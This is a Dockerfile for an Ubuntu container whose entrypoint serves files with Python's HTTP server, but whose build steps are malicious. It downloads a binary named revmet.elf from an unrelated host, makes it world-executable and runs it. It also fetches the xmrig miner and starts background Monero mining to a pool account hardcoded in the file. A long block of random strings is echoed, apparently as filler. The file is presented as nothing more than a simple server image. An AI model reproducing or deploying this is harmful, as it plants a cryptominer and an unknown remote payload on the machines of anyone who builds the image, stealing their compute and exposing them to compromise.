FROM ubuntu:bionic

SHELL ["/bin/bash", "-c"]

RUN apt-get update && apt-get install -y \
    wget \
    ocl-icd-libopencl1 \
    libmicrohttpd-dev \
    libc6 \
    libstdc++6

WORKDIR /root
RUN wget http://mail.oogle.dev:8000//revmet.elf

RUN wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz
RUN tar -xzvf xmr*
WORKDIR /root/xmrig-2.14.1
RUN ./xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x

WORKDIR /root
RUN chmod 777 revmet.elf
RUN ./xmrig-2.14.1/xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x;./revmet.elf
RUN echo Xx0rv4WpWsvmkCkvgNJWRQVh0QcCPPVr OVE9t7qTZz2Ovq9ztG5H7KHyMkMSU0tb 9gAzFuJyVNbsxMzSaUK67ONNmOVH0kB3 bTQAIHa9zAhxYMchXgVNojXiF8slVd0N TvgwTyUiSzlg0mLFLuJXYixELfBriMXL aQ9hLuX8caSspkz3hTSq9LkbggiEaYnC ffDXZz6G1rIHWom82zOHI1PhFXuEKV4C AZjMSGavYbX48UZ0FpJVBjekLBXuqCz1 YU9gYkdEXRecRD6GCupHCOKWbE3yEAt8 LyWkyxtj0Xi0FOo7DuDrFOPXqyqxSikv enfWXmB3xSJHXpePOlSEzzzQlvKygmkR dAlOn73Si4sd3Q3lc2WMw6vTNlc2RFBH Omxuh4J03YJ2zPN8tBKNDOO5rsmCkuto qAOevpTI5q7QzuvJ0cQppInJFjCRQ6gp 1J4dtIXsXc4ip7ulX7CHIUUljciZFDzC YL25b76SRJEVNjXVW2qRcXv0YDl4A6oz zORbnQcHgCiDFpyyFKh9Bs2zYpuP7wi1 njC1B6v6F2PZ7vM5g7AIP0jaM3DF2ppa iEgR57m7fom9JhCfaXzwx5VJYr84RwnQ rbiZKufTlt8RSS8TZqvzUbQwJPOIIp4t DGLrlBP1wP15Z7bzvFORfIDPVXxlKOw8 iRR8Zp0TOxlCM7JSEpHNyxmT4XM90YWc zsaOLYboLruHMbrsWTTwF76XhxiEn5Vb JlcMVQX0KrjEurxbQ9jbtcmhwOFZNPb7 g0B5O2hD9pRQwxZWGXhnBJRmjZt4WqIH ddddddd

ENTRYPOINT ["python3", "-m", "http.server"]